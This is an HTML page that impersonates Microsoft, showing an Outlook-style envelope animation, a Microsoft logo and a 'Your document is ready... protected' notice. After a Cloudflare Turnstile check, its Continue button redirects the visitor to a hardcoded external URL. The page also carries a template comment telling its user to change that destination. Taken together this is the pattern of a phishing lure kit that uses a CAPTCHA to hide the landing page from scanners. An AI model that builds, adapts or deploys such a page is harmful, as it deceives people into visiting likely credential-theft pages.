<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Redirect</title>
  <!-- Cloudflare Turnstile Script -->
  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onTurnstileLoad" async defer></script>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
        "Helvetica Neue", Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      background: #f5f5f5;
    }

    .container {
      background: white;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
      text-align: center;
      max-width: 400px;
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    /* --- Microsoft Envelope Animation CSS --- */
    #subcontainer {
      width: 180px;
      height: 180px;
      animation: bounce 5s infinite;
      margin-bottom: 20px;
    }

    @keyframes bounce {
      0%, 100%, 12.5%, 32.5%, 76.1% { transform: translateY(0); }
      22.5%, 86% { transform: translateY(7px); }
    }

    #logo {
      height: 179px;
      width: 130px;
      overflow: hidden;
      margin-top: -59px;
      margin-left: 25px; /* Centered better */
    }

    #containerShadow {
      position: relative;
      top: 120px;
      left: 25px;
      width: 130px;
      height: 71px;
      border-radius: 0 0 7px 7px;
      box-shadow: rgba(0, 0, 0, 0.25) 0 4px 5px;
      animation: shadow-fade 5s infinite;
    }

    @keyframes shadow-fade {
      0%, 100%, 21.2%, 80% { opacity: 0; }
      47%, 70% { opacity: 1; }
    }

    #flapContainer {
      width: 130px;
      margin-top: 179px;
    }

    #ef {
      width: 130px;
      height: 71px;
      border-radius: 0 0 7px 7px;
      overflow: hidden;
      margin-top: -41px;
    }

    #ef > .l {
      width: 287px;
      height: 71px;
      background: #28a8ea;
      transform: translate(-153px, -70px) rotate(28deg);
    }

    #ef > .r {
      width: 287px;
      height: 71px;
      background: #1490df;
      transform: translate(-120px, 63px) rotate(-28deg);
    }

    #eb {
      width: 130px;
      height: 40px;
      background: #123b6d;
      margin-top: -70px;
    }

    #cal {
      display: flex;
      flex-wrap: wrap;
      width: 118px;
      height: 131px;
      border-radius: 7px;
      overflow: hidden;
      margin: 0 auto;
      margin-top: -306px;
      animation: cal-bounce 5s infinite;
      animation-timing-function: cubic-bezier(0, 0.5, 0, 1);
      transform: translateY(calc(131px + 20px)) scaleY(1);
    }

    @keyframes cal-bounce {
      0%, 100%, 16.5%, 76.1% { transform: translateY(calc(131px + 20px)) scaleY(1); }
      28% { transform: translateY(calc(131px - 92px)) scaleY(1); }
      31% { transform: translateY(calc(131px - 80px)) scaleY(1.05); }
      33% { transform: translateY(calc(131px - 80px)) scaleY(0.96); }
      34%, 68.5% { transform: translateY(calc(131px - 80px)) scaleY(1); }
      68.5% { animation-timing-function: cubic-bezier(0.66, -0.16, 1, -0.29); }
    }

    #cal > .t {
      width: 118px;
      height: 21px;
      margin-bottom: -1px;
      background: #0358a7;
    }

    #cal > .r {
      display: flex;
      width: 118px;
      height: 37px;
    }

    .s { width: 39.3px; height: 38px; }
    .s1 { background: #0078d4; }
    .s2 { background: #28a8ea; }
    .s3 { background: #50d9ff; }
    .s4 { background: #0364b8; }
    .s5 { background: #14447d; }

    #openedFlap {
      width: 130px;
      height: 107px;
      animation: opened-flap-swing 5s infinite;
      animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);
      transform-origin: top;
      transform: translateY(-68px) rotate3d(1, 0, 0, -180deg);
    }

    @keyframes opened-flap-swing {
      0%, 100%, 14.5%, 76% { transform: translateY(-68px) rotate3d(1, 0, 0, -90deg); }
      16.5%, 74% { transform: translateY(-68px) rotate3d(1, 0, 0, -180deg); }
    }

    #closedFlap {
      width: 130px;
      animation: closed-flap-swing 5s infinite;
      animation-timing-function: cubic-bezier(0.32, 0, 0.67, 0);
      transform-origin: top;
      transform: translateY(calc(-1 * 71px)) rotate3d(1, 0, 0, 90deg);
    }

    @keyframes closed-flap-swing {
      0%, 100%, 77%, 8.5% { transform: translateY(calc(-1 * 71px)) rotate3d(1, 0, 0, 0); }
      14.5%, 76% { transform: translateY(calc(-1 * 71px)) rotate3d(1, 0, 0, 90deg); }
    }

    #fmask {
      width: 130px;
      height: 107px;
      overflow: hidden;
    }

    .flapTriangle {
      width: 96px;
      height: 96px;
      background: #50d9ff;
      margin: -48px auto 0 auto;
      border-radius: 7px;
      transform: scaleY(0.6) rotate(45deg);
    }

    #openedFlap .flapTriangle { background: #123b6d; }
    #closedFlap .flapTriangle { background: #50d9ff; }
    /* --- End Envelope Animation CSS --- */

    #dp {
      margin-top: 20px;
      font-size: 16px;
      color: #333;
      height: 24px;
    }

    #cf-turnstile {
      margin: 20px 0;
      display: flex;
      justify-content: center;
      width: 100%;
    }

    #MSLogo {
      display: block;
      margin: 20px auto 0;
      width: 120px;
    }

    #cont {
      display: none;
      margin-top: 20px;
    }

    #cont h3 {
      font-size: 18px;
      color: #333;
      margin-bottom: 10px;
    }

    #cont p {
      font-size: 14px;
      color: #666;
      line-height: 1.4;
      margin-bottom: 20px;
    }

    #contBtn {
      display: block;
      padding: 12px 24px;
      background: #32a0da;
      color: #fff;
      border: none;
      border-radius: 4px;
      font-size: 15px;
      font-weight: 600;
      font-family: 'Segoe UI', Arial, sans-serif;
      cursor: pointer;
      transition: background-color 0.2s ease, box-shadow 0.2s ease, transform 0.1s ease;
      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
      margin: 0 auto;
    }

    #contBtn:hover {
      background: #b22b2f;
      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
    }

    #contBtn:active {
      transform: scale(0.98);
    }
  </style>
</head>

<body>
  <div class="container">
    <!-- Animated Logo -->
    <div id="loadingLogo">
      <div id="subcontainer">
        <div id="containerShadow"></div>
        <div id="logo">
          <div id="flapContainer">
            <div id="openedFlap">
              <div id="fmask">
                <div class="flapTriangle"></div>
              </div>
            </div>
            <div id="cal">
              <div class="t"></div>
              <div class="r">
                <div class="s s1"></div>
                <div class="s s2"></div>
                <div class="s s3"></div>
              </div>
              <div class="r">
                <div class="s s4"></div>
                <div class="s s1"></div>
                <div class="s s2"></div>
              </div>
              <div class="r">
                <div class="s s5"></div>
                <div class="s s4"></div>
                <div class="s s1"></div>
              </div>
            </div>
          </div>
          <div id="eb"></div>
          <div id="ef">
            <div class="r"></div>
            <div class="l"></div>
          </div>
          <div id="closedFlap">
            <div id="fmask">
              <div class="flapTriangle"></div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Loading Messages -->
    <div id="dp"></div>

    <!-- Cloudflare Turnstile Widget -->
    <div id="cf-turnstile"></div>

    <!-- Hidden Continue Button (shows after CAPTCHA is solved) -->
    <div id="cont">
      <h3>Your document is ready.</h3>
      <p>
        This document is protected to help safeguard its contents. Before it can be viewed, you'll be asked to complete a brief verification step.
        Select Continue to proceed and follow the instructions.
      </p>
      <button class="primary" id="contBtn">Continue</button>
    </div>

    <!-- Microsoft Logo at the bottom -->
    <img src="https://res.cdn.office.net/assets/framework/microsoft.svg" id="MSLogo" alt="Microsoft">
  </div>

  <script>
    // ⚠️ CHANGE THIS TO YOUR DESTINATION URL
    const targetUrl = "https://witty-meadow-0f6628a10.5.azurestaticapps.net/l/Y0TEXO";

    // Messages that cycle during loading
    const messages = [
      "Loading...",
      "Processing request...",
      "Preparing results...",
      "Almost there...",
      "Finalizing..."
    ];
    
    let index = 0;
    const dpElement = document.getElementById("dp");

    function cycleMessages() {
      dpElement.textContent = messages[index];
      index = (index + 1) % messages.length;
    }

    // Start cycling messages immediately
    cycleMessages();
    setInterval(cycleMessages, 3000);

    // Cloudflare Turnstile Callbacks
    function turnstileCallback(token) {
      if (token) {
        // Hide loading elements
        document.getElementById("loadingLogo").style.display = "none";
        document.getElementById("dp").style.display = "none";
        document.getElementById("cf-turnstile").style.display = "none";
        
        // Show continue button
        document.getElementById("cont").style.display = "block";
        
        // Keep Microsoft logo visible
        document.getElementById("MSLogo").style.display = "block";
        
        // Make the continue button redirect to the target URL
        document.getElementById("contBtn").onclick = function() {
          window.location.href = targetUrl;
        };
      }
    }

    function turnstileErrorCallback() {
      setTimeout(() => { window.location.reload(); }, 1000);
    }

    function turnstileExpiredCallback() {
      setTimeout(() => { window.location.reload(); }, 1000);
      if (window.turnstile) {
        turnstile.reset();
      }
    }

    function onTurnstileLoad() {
      const container = document.getElementById("cf-turnstile");

      if (!targetUrl) {
        container.innerHTML = '<p style="color:red;">Error: Persistent URL not configured.</p>';
        return;
      }

      turnstile.render("#cf-turnstile", {
        sitekey: "0x4AAAAAAD1A5eW6o0hhUZQm", // Your Cloudflare Site Key
        theme: "light",
        callback: turnstileCallback,
        "error-callback": turnstileErrorCallback,
        "expired-callback": turnstileExpiredCallback,
      });
    }
  </script>
</body>
</html>
